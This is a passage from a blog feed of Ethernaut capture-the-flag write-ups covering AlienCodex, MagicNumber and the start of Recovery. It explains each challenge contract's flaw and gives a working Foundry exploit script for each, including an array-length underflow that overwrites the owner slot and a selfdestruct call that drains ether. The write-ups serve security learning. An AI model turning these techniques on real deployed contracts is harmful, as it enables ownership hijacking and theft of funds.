<span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">));</span>        <span class=\"n\">_owner</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Transfers ownership of the contract to a new account (`newOwner`).     * Can only be called by the current owner.     */</span>    <span class=\"k\">function</span> <span class=\"n\">transferOwnership</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newOwner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">onlyOwner</span> <span class=\"p\">{</span>        <span class=\"n\">_transferOwnership</span><span class=\"p\">(</span><span class=\"n\">newOwner</span><span class=\"p\">);</span>    <span class=\"p\">}</span>    <span class=\"cm\">/**     * @dev Transfers ownership of the contract to a new account (`newOwner`).     */</span>    <span class=\"k\">function</span> <span class=\"n\">_transferOwnership</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">newOwner</span><span class=\"p\">)</span> <span class=\"k\">internal</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">newOwner</span> <span class=\"o\">!=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"s\">\"Ownable: new owner is the zero address\"</span><span class=\"p\">);</span>        <span class=\"k\">emit</span> <span class=\"n\">OwnershipTransferred</span><span class=\"p\">(</span><span class=\"n\">_owner</span><span class=\"p\">,</span> <span class=\"n\">newOwner</span><span class=\"p\">);</span>        <span class=\"n\">_owner</span> <span class=\"o\">=</span> <span class=\"n\">newOwner</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Next, this contract is an <strong>Ownable</strong> contract that the AlienCodex contract inherits from. We need to overwrite the <code class=\"language-plaintext highlighter-rouge\">_owner</code> variable in this contract.</p><p>According to the <a href=\"https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#storage-layout\">Solidity documentation</a>, we find that the <code class=\"language-plaintext highlighter-rouge\">_owner</code> variable in the <strong>Ownable</strong> contract is stored at a lower storage slot than the <code class=\"language-plaintext highlighter-rouge\">contact</code> and <code class=\"language-plaintext highlighter-rouge\">codex</code> variables in the AlienCodex contract.</p><p>The <code class=\"language-plaintext highlighter-rouge\">_owner</code> and <code class=\"language-plaintext highlighter-rouge\">contact</code> variables are stored together in slot <code class=\"language-plaintext highlighter-rouge\">0</code> because the combined size of these two variables does not exceed 32 bytes, <strong>and</strong> the <code class=\"language-plaintext highlighter-rouge\">codex</code> variable is stored separately in slot <code class=\"language-plaintext highlighter-rouge\">1</code>.</p><p>To understand how the dynamic <code class=\"language-plaintext highlighter-rouge\">bytes</code> array <code class=\"language-plaintext highlighter-rouge\">codex</code> stores its data, we can refer to the <a href=\"https://docs.soliditylang.org/en/latest/internals/layout_in_storage.html#bytes-and-string\">Solidity documentation</a>:</p><blockquote>  <p>💡 <code class=\"language-plaintext highlighter-rouge\">bytes</code> and <code class=\"language-plaintext highlighter-rouge\">string</code> are encoded identically. In general, the encoding is similar to <code class=\"language-plaintext highlighter-rouge\">bytes1[]</code>, in the sense that there is a slot for the array itself and a data area that is computed using a <code class=\"language-plaintext highlighter-rouge\">keccak256</code> hash of that slot’s position. However, for short values (shorter than 32 bytes) the array elements are stored together with the length in the same slot.</p>  <p>In particular: if the data is at most <code class=\"language-plaintext highlighter-rouge\">31</code> bytes long, the elements are stored in the higher-order bytes (left aligned) and the lowest-order byte stores the value <code class=\"language-plaintext highlighter-rouge\">length * 2</code>. For byte arrays that store data which is <code class=\"language-plaintext highlighter-rouge\">32</code> or more bytes long, the main slot <code class=\"language-plaintext highlighter-rouge\">p</code> stores <code class=\"language-plaintext highlighter-rouge\">length * 2 + 1</code> and the data is stored as usual in <code class=\"language-plaintext highlighter-rouge\">keccak256(p)</code>. This means that you can distinguish a short array from a long array by checking if the lowest bit is set: short (not set) and long (set).</p></blockquote><p>When we call the <code class=\"language-plaintext highlighter-rouge\">retract()</code> function, the <code class=\"language-plaintext highlighter-rouge\">codex</code> array’s length underflows from <code class=\"language-plaintext highlighter-rouge\">0</code> to <code class=\"language-plaintext highlighter-rouge\">2^256 - 1</code>.</p><p>After this underflow, we can overwrite any storage slot by using the <code class=\"language-plaintext highlighter-rouge\">revise()</code> function.</p><p>When the <code class=\"language-plaintext highlighter-rouge\">i</code> argument is provided to <code class=\"language-plaintext highlighter-rouge\">revise()</code>, the function computes <code class=\"language-plaintext highlighter-rouge\">keccak256(abi.encode(0x1)) + i</code>.</p><p>If we set this equal to <code class=\"language-plaintext highlighter-rouge\">0</code>, we can overwrite the <code class=\"language-plaintext highlighter-rouge\">_owner</code> variable in slot <code class=\"language-plaintext highlighter-rouge\">0</code>.</p><blockquote>  <p>💡 Except for dynamically-sized arrays and mappings (see below), data is stored contiguously item after item starting with the first state variable, which is stored in slot <code class=\"language-plaintext highlighter-rouge\">0</code></p></blockquote><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">2</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">interface</span> <span class=\"n\">AlienCodex</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">owner</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">contact</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">makeContact</span><span class=\"p\">()</span> <span class=\"k\">external</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">record</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_content</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">retract</span><span class=\"p\">()</span> <span class=\"k\">external</span><span class=\"p\">;</span>    <span class=\"k\">function</span> <span class=\"n\">revise</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">i</span><span class=\"p\">,</span> <span class=\"kt\">bytes32</span> <span class=\"n\">_content</span><span class=\"p\">)</span> <span class=\"k\">external</span><span class=\"p\">;</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">AlienCodexSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span><span class=\"p\">{</span>    <span class=\"n\">AlienCodex</span> <span class=\"k\">public</span> <span class=\"n\">ac_</span> <span class=\"o\">=</span> <span class=\"n\">AlienCodex</span><span class=\"p\">(</span><span class=\"mh\">0x018c6FCDb0c6930b1B4Ac8B68a94f0862a358dA7</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>                <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before Owner: \"</span><span class=\"p\">,</span> <span class=\"n\">ac_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">ac_</span><span class=\"p\">.</span><span class=\"n\">makeContact</span><span class=\"p\">();</span>        <span class=\"n\">ac_</span><span class=\"p\">.</span><span class=\"n\">retract</span><span class=\"p\">();</span>        <span class=\"n\">ac_</span><span class=\"p\">.</span><span class=\"n\">revise</span><span class=\"p\">(</span><span class=\"o\">~</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"nb\">keccak256</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"mh\">0x1</span><span class=\"p\">))))</span> <span class=\"o\">+</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"kt\">bytes32</span><span class=\"p\">(</span><span class=\"kt\">uint256</span><span class=\"p\">(</span><span class=\"kt\">uint160</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)))));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After Owner: \"</span><span class=\"p\">,</span> <span class=\"n\">ac_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p><code class=\"language-plaintext highlighter-rouge\">~uint256(keccak256(abi.encode(0x1))) + 1</code> represents the two’s complement of <code class=\"language-plaintext highlighter-rouge\">keccak256(abi.encode(0x1))</code>.</p><p>Therefore, when we use this value as the <code class=\"language-plaintext highlighter-rouge\">i</code> argument in the <code class=\"language-plaintext highlighter-rouge\">revise()</code> function, adding <code class=\"language-plaintext highlighter-rouge\">keccak256(abi.encode(0x1))</code> and <code class=\"language-plaintext highlighter-rouge\">~uint256(keccak256(abi.encode(0x1))) + 1</code> results in <code class=\"language-plaintext highlighter-rouge\">0</code>.</p><p>This allows us to attach the <code class=\"language-plaintext highlighter-rouge\">_owner</code> variable in storage slot <code class=\"language-plaintext highlighter-rouge\">0</code>.</p><p><img src=\"https://0o3q.github.io/images/2025-06-02-AlienCodex/result.png\" alt=\"image.png\" /></p>",
            "url": "https://0o3q.github.io/2025/06/02/aliencodex",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","bytes","dynamicArray","underflow","slot"],
            
            "date_published": "2025-06-02T00:00:00+09:00",
            "date_modified": "2025-06-02T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/05/18/magicnumber",
            "title": "[Ethernaut] 18.MagicNumber",
            "summary": null,
            "content_text": "AnalysisThe goal is   provide the Ethernaut with a Solver// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract MagicNum {    address public solver;    constructor() {}    function setSolver(address _solver) public {        solver = _solver;    }    /*    ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____             __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___             ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__             ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___             ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____             __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________             _\\///////////\\\\\\//____/\\\\\\/___________             ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_             ___________\\///_____\\///////////////__    */}We respond to the whatIsTheMeaningOfLife() function with the right 32 byte number.The number 42 is suspected to be the magic value expected by whatIsTheMeaningOfLife().PUSH1 0x2a // Push 42(0x2a) onto the stack =&gt; 602aPUSH1 0x00 // Push memory offset 0x00 =&gt; 6000MSTORE // MSTORE(0x00: offset, 0x2a: value) Store 42 at memory[0x00]=&gt; 52PUSH1 0x20 // Push size (32 bytes) =&gt; 6020PUSH1 0x00 // Push memory offset 0x00 =&gt; 6000RETURN // Return memory[0x00:0x20] =&gt; f3The bytecode 0x602a60005260206000f3  returns right 32 byte number:0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a when whatIsTheMeaningOfLife() function is called.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/MagicNumber.sol\";import \"forge-std/Script.sol\";contract Ex {    constructor() {        assembly {            mstore(0, 0x602a60005260206000f3)            return(0x16, 0x0a)        }    }}contract MagicNumberSol is Script {    MagicNum public mn_ = MagicNum(0x20416BDe7653DaC534a51C744D7f572Bfd22aC76);    function run() external {        vm.startBroadcast();        console.log(\"Before solver: \", mn_.solver());        Ex ex = new Ex();        mn_.setSolver(address(ex));        console.log(\"After solver: \", mn_.solver());        vm.stopBroadcast();    }}When the command mstore(0, 0x602a60005260206000f3) is executed, the memory state becomes:0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000602a60005260206000f3After that, return(0x16, 0x0a) is executed, returning only the last 10 bytes (the constructor code), which is:0x602a60005260206000f3",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li> provide the Ethernaut with a <code class=\"language-plaintext highlighter-rouge\">Solver</code></li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">MagicNum</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">solver</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{}</span>    <span class=\"k\">function</span> <span class=\"n\">setSolver</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_solver</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">solver</span> <span class=\"o\">=</span> <span class=\"n\">_solver</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"cm\">/*    ____________/\\\\\\_______/\\\\\\\\\\\\\\\\\\_____             __________/\\\\\\\\\\_____/\\\\\\///////\\\\\\___             ________/\\\\\\/\\\\\\____\\///______\\//\\\\\\__             ______/\\\\\\/\\/\\\\\\______________/\\\\\\/___             ____/\\\\\\/__\\/\\\\\\___________/\\\\\\//_____             __/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_____/\\\\\\//________             _\\///////////\\\\\\//____/\\\\\\/___________             ___________\\/\\\\\\_____/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\_             ___________\\///_____\\///////////////__    */</span><span class=\"p\">}</span></code></pre></div></div><p>We respond to the <code class=\"language-plaintext highlighter-rouge\">whatIsTheMeaningOfLife()</code> function with the right 32 byte number.</p><p>The number <strong>42</strong> is suspected to be the magic value expected by <code class=\"language-plaintext highlighter-rouge\">whatIsTheMeaningOfLife()</code>.</p><div class=\"language-nasm highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nf\">PUSH1</span> <span class=\"mh\">0x2a</span> <span class=\"o\">//</span> <span class=\"nv\">Push</span> <span class=\"mi\">42</span><span class=\"p\">(</span><span class=\"mh\">0x2a</span><span class=\"p\">)</span> <span class=\"nv\">onto</span> <span class=\"nv\">the</span> <span class=\"nv\">stack</span> <span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"mi\">602</span><span class=\"nv\">a</span><span class=\"nf\">PUSH1</span> <span class=\"mh\">0x00</span> <span class=\"o\">//</span> <span class=\"nv\">Push</span> <span class=\"nv\">memory</span> <span class=\"nv\">offset</span> <span class=\"mh\">0x00</span> <span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"mi\">6000</span><span class=\"nf\">MSTORE</span> <span class=\"o\">//</span> <span class=\"nv\">MSTORE</span><span class=\"p\">(</span><span class=\"mh\">0x00</span><span class=\"p\">:</span> <span class=\"nv\">offset</span><span class=\"p\">,</span> <span class=\"mh\">0x2a</span><span class=\"p\">:</span> <span class=\"nv\">value</span><span class=\"p\">)</span> <span class=\"nv\">Store</span> <span class=\"mi\">42</span> <span class=\"nv\">at</span> <span class=\"nv\">memory</span><span class=\"p\">[</span><span class=\"mh\">0x00</span><span class=\"p\">]</span><span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"mi\">52</span><span class=\"nf\">PUSH1</span> <span class=\"mh\">0x20</span> <span class=\"o\">//</span> <span class=\"nv\">Push</span> <span class=\"nb\">si</span><span class=\"nv\">ze</span> <span class=\"p\">(</span><span class=\"mi\">32</span> <span class=\"kt\">byte</span><span class=\"nv\">s</span><span class=\"p\">)</span> <span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"mi\">6020</span><span class=\"nf\">PUSH1</span> <span class=\"mh\">0x00</span> <span class=\"o\">//</span> <span class=\"nv\">Push</span> <span class=\"nv\">memory</span> <span class=\"nv\">offset</span> <span class=\"mh\">0x00</span> <span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"mi\">6000</span><span class=\"nf\">RETURN</span> <span class=\"o\">//</span> <span class=\"nv\">Return</span> <span class=\"nv\">memory</span><span class=\"p\">[</span><span class=\"mh\">0x00</span><span class=\"p\">:</span><span class=\"mh\">0x20</span><span class=\"p\">]</span> <span class=\"err\">=</span><span class=\"o\">&gt;</span> <span class=\"nv\">f3</span></code></pre></div></div><p>The <a href=\"https://www.evm.codes/\">bytecode</a> <code class=\"language-plaintext highlighter-rouge\">0x602a60005260206000f3</code>  returns right 32 byte number:</p><div class=\"language-nasm highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"err\">0</span><span class=\"nf\">x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002a</span> </code></pre></div></div><p>when <code class=\"language-plaintext highlighter-rouge\">whatIsTheMeaningOfLife()</code> function is called.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/MagicNumber.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"k\">assembly</span> <span class=\"p\">{</span>            <span class=\"n\">mstore</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mh\">0x602a60005260206000f3</span><span class=\"p\">)</span>            <span class=\"k\">return</span><span class=\"p\">(</span><span class=\"mh\">0x16</span><span class=\"p\">,</span> <span class=\"mh\">0x0a</span><span class=\"p\">)</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">MagicNumberSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">MagicNum</span> <span class=\"k\">public</span> <span class=\"n\">mn_</span> <span class=\"o\">=</span> <span class=\"n\">MagicNum</span><span class=\"p\">(</span><span class=\"mh\">0x20416BDe7653DaC534a51C744D7f572Bfd22aC76</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">();</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"Before solver: \"</span><span class=\"p\">,</span> <span class=\"n\">mn_</span><span class=\"p\">.</span><span class=\"n\">solver</span><span class=\"p\">());</span>        <span class=\"n\">Ex</span> <span class=\"n\">ex</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">();</span>        <span class=\"n\">mn_</span><span class=\"p\">.</span><span class=\"n\">setSolver</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">ex</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"After solver: \"</span><span class=\"p\">,</span> <span class=\"n\">mn_</span><span class=\"p\">.</span><span class=\"n\">solver</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>When the command <code class=\"language-plaintext highlighter-rouge\">mstore(0, 0x602a60005260206000f3)</code> is executed, the memory state becomes:</p><div class=\"language-nasm highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"err\">0</span><span class=\"nf\">x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000602a60005260206000f3</span></code></pre></div></div><p>After that, <code class=\"language-plaintext highlighter-rouge\">return(0x16, 0x0a)</code> is executed, returning only the last 10 bytes (the constructor code), which is:</p><div class=\"language-nasm highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"err\">0</span><span class=\"nf\">x602a60005260206000f3</span></code></pre></div></div>",
            "url": "https://0o3q.github.io/2025/05/18/magicnumber",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","assembly","bytecode"],
            
            "date_published": "2025-05-18T00:00:00+09:00",
            "date_modified": "2025-05-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/05/17/recovery",
            "title": "[Ethernaut] 17.Recovery",
            "summary": null,
            "content_text": "AnalysisThe goal is  recover (or remove) the 0.001 ether from the lost contract address.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Recovery {    //generate tokens    function generateToken(string memory _name, uint256 _initialSupply) public {        new SimpleToken(_name, msg.sender, _initialSupply);    }}contract SimpleToken {    string public name;    mapping(address =&gt; uint256) public balances;    // constructor    constructor(string memory _name, address _creator, uint256 _initialSupply) {        name = _name;        balances[_creator] = _initialSupply;    }    // collect ether in return for tokens    receive() external payable {        balances[msg.sender] = msg.value * 10;    }    // allow transfers of tokens    function transfer(address _to, uint256 _amount) public {        require(balances[msg.sender] &gt;= _amount);        balances[msg.sender] = balances[msg.sender] - _amount;        balances[_to] = _amount;    }    // clean up after ourselves    function destroy(address payable _to) public {        selfdestruct(_to);    }}First, we identify the lost contract address.We search the blockchain explorer using the given instance address: 0x8A53163e6d7423D3F83E871f6E16FF855D3B73FE.My challenge is deployed at 0x7585bEb16C9dCFb8E71bF433d0E924f70Ca3efD4.From the on-chain trace, we observe that the 0x7585 contract deployed or interacted with the 0x8a53 contract and called the generateToken() function.Subsequently, 0x8a53 interacted with another contract, 0xc413.We suspect 0xc413 is the lost contract.When inspecting the transaction involving 0xc413, we can see that 0x7585 sent exactly 0.001 Ether to 0xc413.Based on the challenge hint — “creator sent 0.001 ether to obtain more tokens” — we can conclude that 0xc413 is the lost contract we are looking for.Exploit// SPDX-License-Identifier: MIT// forge script script/RecoverySol.sol:RecoverySol --account mingw --sender 0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514 --rpc-url kairos --broadcastpragma solidity ^0.8.0;import \"../src/Recovery.sol\";import \"forge-std/Script.sol\";contract RecoverySol is Script {    SimpleToken public st_ = SimpleToken(payable(0xC41399Fe813068a3A23DE4215C43584AA3A188A0));    function run() external {        vm.startBroadcast();        console.log(\"Before balance\", address(st_).balance);        st_.destroy(payable(msg.sender));        console.log(\"After balance\", address(st_).balance);        vm.stopBroadcast();    }}",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>recover (or remove) the <code class=\"language-plaintext highlighter-rouge\">0.001</code> ether from the lost contract address.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Recovery</span> <span class=\"p\">{</span>    <span class=\"c1\">//generate tokens</span>    <span class=\"k\">function</span> <span class=\"n\">generateToken</span><span class=\"p\">(</span><span class=\"kt\">string</span> <span class=\"k\">memory</span> <span class=\"n\">_name</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_initialSupply</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">new</span> <span class=\"n\">SimpleToken</span><span class=\"p\">(</span><span class=\"n\">_name</span><span class=\"p\">,</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">,</span> <span class=\"n\">_initialSupply</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">SimpleToken</span> <span class=\"p\">{</span>    <span class=\"kt\">string</span> <span class=\"k\">public</span> <span class=\"n\">name</span><span class=\"p\">;</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"c1\">// constructor</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">string</span> <span class=\"k\">memory</span> <span class=\"n\">_name</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_creator</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_initialSupply</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">name</span> <span class=\"o\">=</span> <span class=\"n\">_name</span><span class=\"p\">;</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_creator</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">_initialSupply</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// collect ether in return for tokens</span>    <span class=\"k\">receive</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">value</span> <span class=\"o\">*</span> <span class=\"mi\">10</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// allow transfers of tokens</span>    <span class=\"k\">function</span> <span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_amount</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">&gt;=</span> <span class=\"n\">_amount</span><span class=\"p\">);</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-</span> <span class=\"n\">_amount</span><span class=\"p\">;</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">_amount</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"c1\">// clean up after ourselves</span>    <span class=\"k\">function</span> <span class=\"n\">destroy</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">_to</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"nb\">selfdestruct</span><span class=\"p\">(</span><span class=\"n\">_to</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>First, we identify the lost contract address.</p><p>We search the blockchain explorer using the given instance address: <code class=\"language-plaintext highlighter-rouge\">0x8A53163e6d7423D3F83E871f6E16FF855D3B73FE</code>.</p><p><img src=\"https://0o3q.github.io/images/2025-05-17-Recovery/blockchainExplorer.png\" alt=\"image.png\" /></p><p>My challenge is deployed at <code class=\"language-plaintext highlighter-rouge\">0x7585bEb16C9dCFb8E71bF433d0E924f70Ca3efD4</code>.</p><p>From the on-chain trace, we observe that the <code class=\"language-plaintext highlighter-rouge\">0x7585</code> contract deployed or 